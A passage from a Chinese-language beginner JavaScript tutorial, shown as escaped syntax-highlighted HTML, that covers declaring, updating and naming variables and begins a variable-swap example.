            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;email&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;kakaxi&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;@&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;itcast&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;cn&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;gz&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2000&lt;/span&gt;;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;myname&lt;/span&gt;);
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;address&lt;/span&gt;);
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt;);
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;email&lt;/span&gt;);
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;gz&lt;/span&gt;);
        &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;

	&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;案例变量的使用2&#34;&gt;案例：变量的使用2&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;弹出一个输入框，提示用户输入姓名&lt;/li&gt;
&lt;li&gt;弹出一个对话框，输出用户刚才输入的姓名。&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http-equiv&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X-UA-Compatible&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ie=edge&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;Document&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
            &lt;span style=&#34;color:#75715e&#34;&gt;// 1. 用户输入姓名 存储到一个 myname 的变量里面
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        	&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;myname&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;prompt&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;请输入你的名字&amp;#39;&lt;/span&gt;);
            &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 输出这个用户名
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;myname&lt;/span&gt;);
        &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;

	&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;33-变量语法扩展&#34;&gt;3.3 变量语法扩展&lt;/h2&gt;
&lt;h3 id=&#34;331-更新变量&#34;&gt;3.3.1 更新变量&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;一个变量被重新赋值后，它原有的值就会被覆盖，变量值将以最后一次赋的值为准&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt;;	&lt;span style=&#34;color:#75715e&#34;&gt;// 最后的结果就是81因为18被覆盖掉了
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;332-同时声明多个变量&#34;&gt;3.3.2 同时声明多个变量&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;同时声明多个变量时，只需要写一个var，多个变量名之间使用英文逗号隔开。&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;zs&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;sez&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;333-声明变量的特殊情况&#34;&gt;3.3.3 声明变量的特殊情况&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200504022315.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http-equiv&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X-UA-Compatible&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ie=edge&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;Document&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
            &lt;span style=&#34;color:#75715e&#34;&gt;// 1. 更新变量
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;myname&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pink老师&amp;#39;&lt;/span&gt;;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;myname&lt;/span&gt;);
            &lt;span style=&#34;color:#a6e22e&#34;&gt;myname&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;迪丽热巴&amp;#39;&lt;/span&gt;;
            &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 声明多个变量
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;address&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;火影村&amp;#39;&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;gz&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2000&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;address&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;火影村&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;gz&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2000&lt;/span&gt;;
            &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 声明变量的特殊情况
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 3.1 只声明不赋值，结果是？程序也不知道里面存的是啥，所以结果是 undefined 未定义的
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sex&lt;/span&gt;;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;sex&lt;/span&gt;);	&lt;span style=&#34;color:#75715e&#34;&gt;// undefined
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 3.2 不声明不赋值，直接使用某个变量会报错
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;tel&lt;/span&gt;)
            &lt;span style=&#34;color:#75715e&#34;&gt;// 3.3 不声明直接赋值使用，
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;qq&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;110&lt;/span&gt;;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;qq&lt;/span&gt;);
        &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;

	&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;34-变量命名规范&#34;&gt;3.4 变量命名规范&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;由字母（&lt;code&gt;A-Z，a-z&lt;/code&gt;）、数字（&lt;code&gt;0-9&lt;/code&gt;）、下划线（&lt;code&gt;_&lt;/code&gt;）、美元符号（&lt;code&gt;$&lt;/code&gt;）组成，如：&lt;code&gt;usrAge&lt;/code&gt;，&lt;code&gt;num01&lt;/code&gt;，&lt;code&gt;_name&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;严格区分大小写。&lt;code&gt;var app;&lt;/code&gt;和&lt;code&gt;var App;&lt;/code&gt;是两个变量&lt;/li&gt;
&lt;li&gt;不能以数字开头。&lt;code&gt;18age&lt;/code&gt;是错误的&lt;/li&gt;
&lt;li&gt;不能是关键字、保留字。例如：&lt;code&gt;var&lt;/code&gt;，&lt;code&gt;for&lt;/code&gt;，&lt;code&gt;while&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;变量名必须有意义。MMD BBD nl -&amp;gt; age&lt;/li&gt;
&lt;li&gt;遵守驼峰命名法。首字母小写，后面单词的首字母需要大写。没有FirstName&lt;/li&gt;
&lt;li&gt;推荐翻译网站：有道、爱词霸。&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http-equiv&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X-UA-Compatible&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ie=edge&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;Document&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;App&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;;
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;app&lt;/span&gt;);
            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;App&lt;/span&gt;);
            &lt;span style=&#34;color:#75715e&#34;&gt;// var 18age;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// var var; 因为var 有特殊意义了，这个叫做关键字，不能作为变量名的
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// name 我们尽量不要直接使用name，作为变量名
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// console.log(tel);
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;);
        &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;

	&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;body&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;35-交换变量案例&#34;&gt;3.5 交换变量案例&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;要求：交换两个变量的值（实现思路：使用一个临时变量用来坐中间存储）&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;html&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lang&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;head&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;charset&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;viewport&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;meta&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http-equiv&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X-UA-Compatible&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ie=edge&amp;#34;&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;Document&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;title&lt;/span&gt;&amp;gt;
        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
            &lt;span style=&#34;color:#75715e&#34;&gt;// js 是编程语言，有很强的逻辑性在里面：实现这个要求的思路，先怎么做后怎么做
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 1. 我们需要一个临时变量帮我们
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 把apple1 给我们的临时变量 temp
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 把apple2 里面的苹果给apple1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 4. 把临时变量里面的值给apple2
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;temp&lt;/span&gt;;	&lt;span style=&#34;color:#75715e&#34;&gt;// 声明了一个临时变量为空
